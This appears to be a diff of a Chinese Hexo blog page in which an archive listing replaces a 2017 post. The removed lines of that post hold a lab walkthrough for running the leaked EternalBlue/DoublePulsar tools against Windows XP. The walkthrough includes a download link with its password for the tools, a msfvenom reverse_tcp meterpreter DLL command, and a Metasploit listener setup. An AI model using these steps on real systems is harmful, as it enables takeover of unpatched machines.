@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     
-    <title>ShadowBrokers漏洞利用工具使用（1） | 1ABlades&#39; blog</title>
+    <title>Archives: 2017 | 1ABlades&#39; blog</title>
     
     <link rel="alternative" href="/atom.xml" title="1ABlades&#39; blog" type="application/atom+xml">
     
@@ -40,95 +40,44 @@
         
     </header>
     <div class="site-body">
-        <div class="global-width">
-    <article class="article" data-layout="post" data-slug="ShadowBrokers漏洞利用工具使用（1）">
-        <div class="article-content">
-            
-            
-            <header class="article-header">
-                <div class="article-meta">
-                    <a href="/2017/04/19/ShadowBrokers漏洞利用工具使用（1）/" class="article-date">
-  <time datetime="2017-04-19T07:43:23.000Z">2017-04-19</time>
-</a>
-                    
-                    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+        
 
-                </div>
-                
-    <h1 class="article-title" itemprop="name">
-      <a href="/2017/04/19/ShadowBrokers漏洞利用工具使用（1）/">ShadowBrokers漏洞利用工具使用（1）</a>
+    
+    <div class="global-width">
+        <section class="archives">
+            
+                <article class="archive-article archive-type-post">
+    <div class="archive-article-inner" >
+        <header class="archive-article-header">
+            <a href="/2017/03/14/SQL字符限制导致任意用户登陆/" class="archive-article-year">
+  <time datetime="2017-03-14T07:36:10.000Z">2017.</time>
+</a><!--
+            --><a href="/2017/03/14/SQL字符限制导致任意用户登陆/" class="archive-article-date">
+  <time datetime="2017-03-14T07:36:10.000Z">03.14</time>
+</a>
+            
+    <h1 class="archive-article-title" itemprop="name">
+      <a href="/2017/03/14/SQL字符限制导致任意用户登陆/">SQL字符限制导致任意用户登陆</a>
     </h1>
 
-            </header>
+        </header>
+    </div>
+</article>
             
-            <div class="article-body">
-                <p>FuzzBunch之Eternalblue</p>
-<p>利用MS17-010漏洞 入侵winxp win server 2008 或 win7。<br>最近方程式组织爆出漏洞以及shadowbrokers放出的工具搞得沸沸扬扬，本篇的工具shadowbrokers早在12年就已经写出来了，有点可怕。<br>附上工具链接<br>链接：<a href="http://pan.baidu.com/s/1ge2RFVH" target="_blank" rel="external">http://pan.baidu.com/s/1ge2RFVH</a> 密码：0dtr</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
-<li>win7     攻击机   192.168.226.128    环境需要python2.6.6以及pywin32</li>
-<li>winxp    靶机     192.168.226.130    开启SMB服务 445端口 建议关闭防火墙</li>
-<li>kali2             192.168.226.136    用来生成攻击payload和反弹shell</li>
-</ul>
-<h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><p>将windows目录拷贝到攻击机win7上，在目录下建立文件夹listeningposts</p>
-<p>运行fb.py</p>
-<p><img src="http://123.206.81.232/img/eternalblue/fb_1.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_2.png" alt="请输入图片描述"></p>
-<p>日志就放在windows下有个log_dirs<br>之后会询问new project name 就是日志文件名称</p>
-<p>然后执行</p>
-<pre><code>use ETERNALBLUE
-</code></pre><p>一路回车直到</p>
-<p><img src="http://123.206.81.232/img/eternalblue/fb_3.png" alt="请输入图片描述"></p>
-<p>这里mode选择1 使用常规部署方式 也就是在靶机上建立后门 带有模糊测试</p>
-<p>然后一路回车</p>
-<p><img src="http://123.206.81.232/img/eternalblue/fb_4.png" alt="请输入图片描述"></p>
-<p>执行成功</p>
-<p>然后我们到kali2下用msf生成用于反弹shell的dll</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=8089 -f dll &gt; reverser_tcp.dll
-</code></pre><p>将reverser_tcp.dll文件拷贝到win7的C盘根目录下<br>在msf下开启msfpayload监听</p>
-<pre><code>msfconsole
-
-msf &gt;   use exploit/multi/handler
-        set LHOST 192.168.226.136
-        set LPORT 8089
-        set PAYLOAD windows/meterpreter/reverse_tcp
-        exploit
-</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_5.png" alt="请输入图片描述"></p>
-<p>然后在winxp中执行</p>
-<pre><code>use DOUBLEPULSAR
-</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_6.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_7.png" alt="请输入图片描述"></p>
-<p>利用成功</p>
-<p><img src="http://123.206.81.232/img/eternalblue/fb_8.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_9.png" alt="请输入图片描述"></p>
-<p>成功控制靶机</p>
-
-            </div>
-        </div>
-    </article>
-
-    
-    
-<nav class="article-nav">
-  
-    <a href="/2017/08/08/hexo-github-blog搭建/" id="article-nav-newer" class="article-nav-link-wrap prev">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
+        </section>
         
-          hexo+github blog搭建
+        <nav class="page-nav">
+            <a class="extend prev" rel="prev" href="/archives/2017/">Newer</a><a class="page-number" href="/archives/2017/">1</a><span class="page-number current">2</span>
+        </nav>
         
-      </div>
-    </a>
-  
-  
-    <a href="/2017/04/11/phpMyAdmin-getshell/" id="article-nav-older" class="article-nav-link-wrap next">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">phpMyAdmin getshell</div>
-    </a>
-  
-</nav>
+    </div>
 
-    
 
-    
-</div>
+
+<span id="busuanzi_container_page_pv">
+   阅读<span id="busuanzi_value_page_pv"></span>次
+</span>
+
     </div>
     <footer class="site-footer">
         <div class="global-width">
